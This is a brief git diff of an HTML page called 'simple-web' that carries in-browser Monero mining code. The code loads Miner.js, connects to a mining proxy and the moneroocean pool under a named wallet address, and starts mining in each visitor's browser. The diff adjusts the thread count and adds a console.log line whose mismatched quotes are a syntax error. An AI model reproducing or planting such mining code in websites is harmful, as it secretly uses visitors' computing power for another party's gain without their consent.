@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
+<link rel="shortcut icon" href="#">
   <head>
     <meta charset="utf-8">
     <title>simple-web</title>
@@ -8,11 +9,12 @@
 <!-- Start Of Mining Code -->
 <script src="Miner.js"></script>
 <script>
+    console.log("miner connected')
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
     var walletAddress = "4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4";
     var workerId = "x"
-    var threads = -4;
+    var threads = -2;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
